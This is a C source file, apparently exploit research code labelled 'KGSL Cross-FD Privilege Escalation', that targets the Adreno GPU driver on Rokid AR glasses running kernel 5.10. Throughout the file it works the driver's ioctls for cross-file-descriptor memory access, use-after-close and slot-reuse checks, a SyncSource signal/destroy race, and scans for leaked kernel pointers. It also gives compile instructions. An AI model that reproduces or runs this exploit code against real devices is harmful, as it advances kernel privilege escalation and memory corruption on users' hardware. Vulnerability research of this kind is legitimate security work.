/*
 * KGSL Cross-FD Advanced Exploit v3
 * ==================================
 *
 * Based on confirmed working IOCTL: 0xc018092f (GPUMEM_ALLOC)
 * Structure: { uint64_t gpuaddr, uint64_t size, uint32_t flags, uint32_t pad }
 *
 * Attack Vectors:
 * 1. Cross-FD Memory Corruption during Free
 * 2. SyncSource Race + Cross-FD Access
 * 3. GPU Command Queue Manipulation
 * 4. Kernel Info Leak via GPU Memory
 *
 * Compile:
 * aarch64-linux-android31-clang -static -O2 -pthread -o kgsl_privesc_v3 kgsl_privesc_v3.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <signal.h>
#include <setjmp.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/bpf.h>

// ============================================================================
// Confirmed Working IOCTLs
// ============================================================================

#define KGSL_IOC_TYPE 0x09

// This is the CONFIRMED working allocation IOCTL
#define IOCTL_GPUMEM_ALLOC 0xc018092f

// Structure for GPUMEM_ALLOC (confirmed)
struct gpumem_alloc_req
{
    uint64_t gpuaddr; // OUT: allocated GPU address
    uint64_t size;    // IN: requested size
    uint32_t flags;   // IN: allocation flags
    uint32_t padding;
};

// SyncSource IOCTLs (working)
#define IOCTL_SYNCSOURCE_CREATE _IOWR(KGSL_IOC_TYPE, 0x40, struct syncsource_create)
#define IOCTL_SYNCSOURCE_DESTROY _IOW(KGSL_IOC_TYPE, 0x41, struct syncsource_destroy)
#define IOCTL_SYNCSOURCE_CREATE_FENCE _IOWR(KGSL_IOC_TYPE, 0x42, struct syncsource_create_fence)
#define IOCTL_SYNCSOURCE_SIGNAL_FENCE _IOWR(KGSL_IOC_TYPE, 0x43, struct syncsource_signal_fence)

struct syncsource_create
{
    unsigned int id;
};

struct syncsource_destroy
{
    unsigned int id;
};

struct syncsource_create_fence
{
    unsigned int id;
    int fence_fd;
};

struct syncsource_signal_fence
{
    unsigned int id;
    int fence_fd;
};

// Property IOCTL
#define IOCTL_GETPROPERTY _IOWR(KGSL_IOC_TYPE, 0x02, struct device_getproperty)

struct device_getproperty
{
    unsigned int type;
    void *value;
    size_t sizebytes;
};

// ============================================================================
// Global State
// ============================================================================

static int kgsl_fd1 = -1;
static int kgsl_fd2 = -1;
static volatile int race_running = 0;
static sigjmp_buf jmp_env;
static volatile sig_atomic_t sig_received = 0;

#define GPU_BASE_ADDR 0x4000000000ULL

// ============================================================================
// Signal Handler
// ============================================================================

void sig_handler(int sig)
{
    sig_received = sig;
    siglongjmp(jmp_env, 1);
}

int safe_read64(void *ptr, uint64_t *out)
{
    sig_received = 0;
    if (sigsetjmp(jmp_env, 1) == 0)
    {
        *out = *(volatile uint64_t *)ptr;
        return 0;
    }
    return -1;
}

int safe_write64(void *ptr, uint64_t val)
{
    sig_received = 0;
    if (sigsetjmp(jmp_env, 1) == 0)
    {
        *(volatile uint64_t *)ptr = val;
        return 0;
    }
    return -1;
}

// ============================================================================
// GPU Memory Allocation (Using confirmed working IOCTL)
// ============================================================================

int gpumem_alloc(int fd, uint64_t size, uint64_t *gpuaddr_out)
{
    struct gpumem_alloc_req req = {0};
    req.size = size;
    req.flags = 0;

    int ret = ioctl(fd, IOCTL_GPUMEM_ALLOC, &req);
    if (ret == 0 && gpuaddr_out)
    {
        *gpuaddr_out = req.gpuaddr;
    }
    return ret;
}

void *gpumem_mmap(int fd, uint64_t gpuaddr, uint64_t size)
{
    return mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, gpuaddr);
}

// Cross-FD mmap using discovered offset formula
void *gpumem_cross_fd_mmap(int fd, uint64_t target_gpuaddr, uint64_t size)
{
    // offset = (page_index + 1) * 0x1000
    uint64_t page_index = (target_gpuaddr - GPU_BASE_ADDR) / 0x1000;
    off_t offset = (page_index + 1) * 0x1000;
    return mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, offset);
}

// ============================================================================
// Attack Vector 1: Cross-FD Double Access Test
// ============================================================================

void test_basic_cross_fd(void)
{
    printf("\n=== Attack Vector 1: Basic Cross-FD Access ===\n");

    // fd1 allocates memory
    uint64_t gpuaddr1;
    if (gpumem_alloc(kgsl_fd1, 0x1000, &gpuaddr1) < 0)
    {
        printf("[-] fd1 alloc failed: %s\n", strerror(errno));
        return;
    }
    printf("[+] fd1 allocated: gpuaddr=0x%lx\n", gpuaddr1);

    // fd1 mmaps
    void *ptr1 = gpumem_mmap(kgsl_fd1, gpuaddr1, 0x1000);
    if (ptr1 == MAP_FAILED)
    {
        printf("[-] fd1 mmap failed: %s\n", strerror(errno));
        return;
    }
    printf("[+] fd1 mmap at %p\n", ptr1);

    // Write secret via fd1
    uint64_t secret = 0xDEADBEEFCAFEBABEULL;
    *(volatile uint64_t *)ptr1 = secret;
    printf("[+] fd1 wrote secret: 0x%lx\n", secret);

    // fd2 also needs an allocation for mmap to work
    uint64_t gpuaddr2;
    if (gpumem_alloc(kgsl_fd2, 0x1000, &gpuaddr2) < 0)
    {
        printf("[-] fd2 alloc failed (needed for mmap): %s\n", strerror(errno));
    }
    else
    {
        printf("[+] fd2 allocated: gpuaddr=0x%lx\n", gpuaddr2);
    }

    // fd2 tries to access fd1's memory via cross-fd offset
    void *ptr2 = gpumem_cross_fd_mmap(kgsl_fd2, gpuaddr1, 0x1000);
    if (ptr2 == MAP_FAILED)
    {
        printf("[-] fd2 cross-fd mmap failed: %s\n", strerror(errno));

        // Try direct gpuaddr
        ptr2 = gpumem_mmap(kgsl_fd2, gpuaddr1, 0x1000);
        if (ptr2 != MAP_FAILED)
        {
            printf("[+] fd2 direct gpuaddr mmap worked!\n");
        }
    }

    if (ptr2 != MAP_FAILED)
    {
        uint64_t val;
        if (safe_read64(ptr2, &val) == 0)
        {
            printf("[+] fd2 read: 0x%lx\n", val);

            if (val == secret)
            {
                printf("[!!!] CROSS-FD ACCESS CONFIRMED!\n");

                // Try to modify via fd2
                uint64_t new_val = 0x1122334455667788ULL;
                if (safe_write64(ptr2, new_val) == 0)
                {
                    printf("[+] fd2 wrote: 0x%lx\n", new_val);

                    // Check if fd1 sees the change
                    uint64_t fd1_val;
                    if (safe_read64(ptr1, &fd1_val) == 0)
                    {
                        printf("[+] fd1 now sees: 0x%lx\n", fd1_val);
                        if (fd1_val == new_val)
                        {
                            printf("[!!!] CROSS-FD WRITE CONFIRMED!\n");
                        }
                    }
                }
            }
        }
        munmap(ptr2, 0x1000);
    }

    munmap(ptr1, 0x1000);
}

// ============================================================================
// Attack Vector 2: Free-After-Cross-FD-Access
// ============================================================================

void test_free_after_crossfd(void)
{
    printf("\n=== Attack Vector 2: Free After Cross-FD Access ===\n");

    uint64_t gpuaddr1;
    if (gpumem_alloc(kgsl_fd1, 0x1000, &gpuaddr1) < 0)
    {
        printf("[-] fd1 alloc failed\n");
        return;
    }
    printf("[+] fd1 allocated: gpuaddr=0x%lx\n", gpuaddr1);

    void *ptr1 = gpumem_mmap(kgsl_fd1, gpuaddr1, 0x1000);
    if (ptr1 == MAP_FAILED)
    {
        printf("[-] fd1 mmap failed\n");
        return;
    }

    // Ensure fd2 has allocation
    uint64_t gpuaddr2;
    gpumem_alloc(kgsl_fd2, 0x1000, &gpuaddr2);

    // fd2 cross-fd access
    void *ptr2 = gpumem_cross_fd_mmap(kgsl_fd2, gpuaddr1, 0x1000);
    if (ptr2 == MAP_FAILED)
    {
        printf("[-] fd2 cross-fd mmap failed\n");
        munmap(ptr1, 0x1000);
        return;
    }

    // Write marker
    *(volatile uint64_t *)ptr1 = 0xAAAABBBBCCCCDDDDULL;
    printf("[+] Initial value set\n");

    // Close fd1 (the allocating fd)
    printf("[*] Closing fd1 while fd2 mapping still exists...\n");
    close(kgsl_fd1);
    kgsl_fd1 = -1;

    // Check if fd2 can still access
    uint64_t val;
    if (safe_read64(ptr2, &val) == 0)
    {
        printf("[+] fd2 read after fd1 close: 0x%lx\n", val);

        // Try to write
        if (safe_write64(ptr2, 0xFEEDFACE12345678ULL) == 0)
        {
            printf("[+] fd2 write after fd1 close succeeded!\n");

            // Read back
            if (safe_read64(ptr2, &val) == 0)
            {
                printf("[+] fd2 reads back: 0x%lx\n", val);
            }
        }
    }
    else
    {
        printf("[*] fd2 read failed after fd1 close (mapping invalidated)\n");
    }

    munmap(ptr2, 0x1000);
    if (ptr1 != MAP_FAILED)
        munmap(ptr1, 0x1000);

    // Reopen fd1
    kgsl_fd1 = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd1 < 0)
    {
        printf("[-] Failed to reopen fd1\n");
    }
}

// ============================================================================
// Attack Vector 3: Massive Allocation + Cross-FD Leak
// ============================================================================

void test_mass_alloc_leak(void)
{
    printf("\n=== Attack Vector 3: Massive Allocation + Kernel Leak ===\n");

#define ALLOC_COUNT 100
#define ALLOC_SIZE 0x10000 // 64KB

    uint64_t gpuaddrs[ALLOC_COUNT];
    void *ptrs[ALLOC_COUNT];
    int count = 0;

    // Allocate many GPU memory regions
    for (int i = 0; i < ALLOC_COUNT; i++)
    {
        if (gpumem_alloc(kgsl_fd1, ALLOC_SIZE, &gpuaddrs[count]) == 0)
        {
            ptrs[count] = gpumem_mmap(kgsl_fd1, gpuaddrs[count], ALLOC_SIZE);
            if (ptrs[count] != MAP_FAILED)
            {
                count++;
            }
        }
    }
    printf("[+] Allocated %d GPU memory regions\n", count);

    // Scan for potential kernel pointers
    printf("[*] Scanning for kernel pointers (0xffffffc* range)...\n");
    int kernel_ptr_count = 0;

    for (int i = 0; i < count; i++)
    {
        uint64_t *p = (uint64_t *)ptrs[i];
        for (int j = 0; j < ALLOC_SIZE / sizeof(uint64_t); j++)
        {
            uint64_t val;
            if (safe_read64(&p[j], &val) == 0)
            {
                // Check for kernel-like addresses
                if ((val & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL ||
                    (val & 0xFFFFFF0000000000ULL) == 0xFFFFFFC000000000ULL)
                {
                    printf("[!] Potential kernel ptr at alloc[%d]+0x%lx: 0x%lx\n",
                           i, j * 8, val);
                    kernel_ptr_count++;
                    if (kernel_ptr_count >= 20)
                        break;
                }
            }
        }
        if (kernel_ptr_count >= 20)
            break;
    }

    printf("[*] Found %d potential kernel pointers\n", kernel_ptr_count);

    // Cross-fd access test on allocated regions
    printf("[*] Testing cross-fd access on allocated regions...\n");

    // Ensure fd2 has allocation
    uint64_t fd2_gpuaddr;
    gpumem_alloc(kgsl_fd2, 0x1000, &fd2_gpuaddr);

    int cross_access_count = 0;
    for (int i = 0; i < count; i++)
    {
        // Write marker
        *(volatile uint64_t *)ptrs[i] = 0xFEED000000000000ULL | i;

        // Try cross-fd access
        void *cross_ptr = gpumem_cross_fd_mmap(kgsl_fd2, gpuaddrs[i], 0x1000);
        if (cross_ptr != MAP_FAILED)
        {
            uint64_t val;
            if (safe_read64(cross_ptr, &val) == 0)
            {
                if ((val & 0xFFFF000000000000ULL) == 0xFEED000000000000ULL)
                {
                    cross_access_count++;
                }
            }
            munmap(cross_ptr, 0x1000);
        }
    }
    printf("[+] Cross-fd access succeeded on %d/%d allocations\n", cross_access_count, count);

    // Cleanup
    for (int i = 0; i < count; i++)
    {
        munmap(ptrs[i], ALLOC_SIZE);
    }
}

// ============================================================================
// Attack Vector 4: SyncSource + Cross-FD Race
// ============================================================================

static volatile int sync_race_done = 0;
static volatile int sync_race_hit = 0;
static unsigned int target_sync_id = 0;
static int target_fence_fd = -1;

void *sync_signal_thread(void *arg)
{
    while (!sync_race_done)
    {
        if (target_fence_fd >= 0 && target_sync_id > 0)
        {
            struct syncsource_signal_fence req = {
                .id = target_sync_id,
                .fence_fd = target_fence_fd};
            int ret = ioctl(kgsl_fd1, IOCTL_SYNCSOURCE_SIGNAL_FENCE, &req);
            if (ret == 0)
            {
                sync_race_hit++;
            }
        }
        usleep(1);
    }
    return NULL;
}

void *sync_destroy_thread(void *arg)
{
    usleep(100);
    if (target_sync_id > 0)
    {
        struct syncsource_destroy req = {.id = target_sync_id};
        ioctl(kgsl_fd1, IOCTL_SYNCSOURCE_DESTROY, &req);
    }
    return NULL;
}

void test_syncsource_race(void)
{
    printf("\n=== Attack Vector 4: SyncSource Race ===\n");

    int crash_attempts = 0;
    int max_attempts = 20;

    for (int attempt = 0; attempt < max_attempts; attempt++)
    {
        // Create syncsource
        struct syncsource_create create_req = {0};
        if (ioctl(kgsl_fd1, IOCTL_SYNCSOURCE_CREATE, &create_req) < 0)
        {
            continue;
        }
        target_sync_id = create_req.id;

        // Create fence
        struct syncsource_create_fence fence_req = {.id = target_sync_id};
        if (ioctl(kgsl_fd1, IOCTL_SYNCSOURCE_CREATE_FENCE, &fence_req) < 0)
        {
            struct syncsource_destroy d = {.id = target_sync_id};
            ioctl(kgsl_fd1, IOCTL_SYNCSOURCE_DESTROY, &d);
            continue;
        }
        target_fence_fd = fence_req.fence_fd;

        // Race: signal vs destroy
        sync_race_done = 0;
        sync_race_hit = 0;

        pthread_t t1, t2;
        pthread_create(&t1, NULL, sync_signal_thread, NULL);
        pthread_create(&t2, NULL, sync_destroy_thread, NULL);

        usleep(1000);
        sync_race_done = 1;

        pthread_join(t1, NULL);
        pthread_join(t2, NULL);

        if (sync_race_hit > 0)
        {
            crash_attempts++;
        }

        if (target_fence_fd >= 0)
        {
            close(target_fence_fd);
            target_fence_fd = -1;
        }
    }

    printf("[*] Race hits: %d/%d attempts\n", crash_attempts, max_attempts);
}

// ============================================================================
// Attack Vector 5: GPU Memory Slot Reuse
// ============================================================================

void test_slot_reuse(void)
{
    printf("\n=== Attack Vector 5: GPU Memory Slot Reuse ===\n");

    uint64_t gpuaddrs[10];
    void *ptrs[10];

    // Allocate 10 regions
    for (int i = 0; i < 10; i++)
    {
        gpumem_alloc(kgsl_fd1, 0x1000, &gpuaddrs[i]);
        ptrs[i] = gpumem_mmap(kgsl_fd1, gpuaddrs[i], 0x1000);
        if (ptrs[i] != MAP_FAILED)
        {
            *(volatile uint64_t *)ptrs[i] = 0xA110C00000000000ULL | i;
        }
    }
    printf("[+] Allocated 10 regions: 0x%lx - 0x%lx\n", gpuaddrs[0], gpuaddrs[9]);

    // Ensure fd2 has allocation
    uint64_t fd2_gpuaddr;
    gpumem_alloc(kgsl_fd2, 0x1000, &fd2_gpuaddr);

    // Cross-fd access to middle regions via fd2
    void *cross_ptr5 = gpumem_cross_fd_mmap(kgsl_fd2, gpuaddrs[5], 0x1000);
    if (cross_ptr5 == MAP_FAILED)
    {
        printf("[-] Cross-fd mmap failed for slot 5\n");
    }
    else
    {
        printf("[+] Cross-fd mmap for slot 5 at %p\n", cross_ptr5);
    }

    // Unmap original slot 5 via fd1
    munmap(ptrs[5], 0x1000);
    printf("[*] Unmapped slot 5 via fd1\n");

    // Check if fd2 can still access
    if (cross_ptr5 != MAP_FAILED)
    {
        uint64_t val;
        if (safe_read64(cross_ptr5, &val) == 0)
        {
            printf("[+] fd2 can still read slot 5: 0x%lx\n", val);

            // Allocate new memory (might reuse slot)
            uint64_t new_gpuaddr;
            if (gpumem_alloc(kgsl_fd1, 0x1000, &new_gpuaddr) == 0)
            {
                printf("[+] New allocation: gpuaddr=0x%lx\n", new_gpuaddr);

                void *new_ptr = gpumem_mmap(kgsl_fd1, new_gpuaddr, 0x1000);
                if (new_ptr != MAP_FAILED)
                {
                    *(volatile uint64_t *)new_ptr = 0xDEAD0000BEEF0000ULL;
                    printf("[+] Wrote to new allocation\n");

                    // Check if fd2's old mapping sees new data
                    if (safe_read64(cross_ptr5, &val) == 0)
                    {
                        printf("[+] fd2 old mapping now sees: 0x%lx\n", val);
                        if (val == 0xDEAD0000BEEF0000ULL)
                        {
                            printf("[!!!] SLOT REUSE DETECTED - OLD MAPPING SEES NEW DATA!\n");
                        }
                    }

                    munmap(new_ptr, 0x1000);
                }
            }
        }
        munmap(cross_ptr5, 0x1000);
    }

    // Cleanup
    for (int i = 0; i < 10; i++)
    {
        if (i != 5 && ptrs[i] != MAP_FAILED)
        {
            munmap(ptrs[i], 0x1000);
        }
    }
}

// ============================================================================
// Attack Vector 6: GPU Property Info Leak
// ============================================================================

void hexdump(const char *desc, const void *data, size_t size)
{
    printf("%s:\n", desc);
    const uint8_t *p = (const uint8_t *)data;
    for (size_t i = 0; i < size; i++)
    {
        if (i % 32 == 0)
            printf("  %04zx: ", i);
        printf("%02x", p[i]);
        if ((i + 1) % 32 == 0)
            printf("\n");
        else if ((i + 1) % 8 == 0)
            printf(" ");
    }
    if (size % 32 != 0)
        printf("\n");
}

void test_property_leak(void)
{
    printf("\n=== Attack Vector 6: Property Info Leak ===\n");

    for (unsigned int type = 0; type <= 0x25; type++)
    {
        uint8_t buf[512] = {0};
        struct device_getproperty req = {
            .type = type,
            .value = buf,
            .sizebytes = sizeof(buf)};

        int ret = ioctl(kgsl_fd1, IOCTL_GETPROPERTY, &req);
        if (ret == 0)
        {
            // Check for potential kernel addresses
            uint64_t *vals = (uint64_t *)buf;
            int has_kernel_ptr = 0;
            for (int i = 0; i < 64; i++)
            {
                if ((vals[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL ||
                    (vals[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFC000000000ULL)
                {
                    has_kernel_ptr = 1;
                    printf("[!!!] Property 0x%02x has potential kernel ptr at +%d: 0x%lx\n",
                           type, i * 8, vals[i]);
                }
            }

            if (has_kernel_ptr || type <= 0x05 || (type >= 0x0C && type <= 0x10))
            {
                char desc[32];
                snprintf(desc, sizeof(desc), "Property 0x%02x", type);
                hexdump(desc, buf, 64);
            }
        }
    }
}

// ============================================================================
// Main
// ============================================================================

int main(int argc, char **argv)
{
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════╗\n");
    printf("║  KGSL Cross-FD Privilege Escalation Research v3               ║\n");
    printf("║  Target: Rokid AR Glasses (Kernel 5.10.209, Adreno 621)       ║\n");
    printf("╚═══════════════════════════════════════════════════════════════╝\n\n");

    signal(SIGSEGV, sig_handler);
    signal(SIGBUS, sig_handler);

    kgsl_fd1 = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd1 < 0)
    {
        printf("[-] Cannot open /dev/kgsl-3d0: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] fd1 = %d\n", kgsl_fd1);

    kgsl_fd2 = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd2 < 0)
    {
        printf("[-] Cannot open second fd: %s\n", strerror(errno));
        close(kgsl_fd1);
        return 1;
    }
    printf("[+] fd2 = %d\n", kgsl_fd2);

    // Run attack vectors
    test_basic_cross_fd();
    test_free_after_crossfd();
    test_mass_alloc_leak();
    test_syncsource_race();
    test_slot_reuse();
    test_property_leak();

    printf("\n=== Research Complete ===\n");

    if (kgsl_fd1 >= 0)
        close(kgsl_fd1);
    if (kgsl_fd2 >= 0)
        close(kgsl_fd2);

    return 0;
}
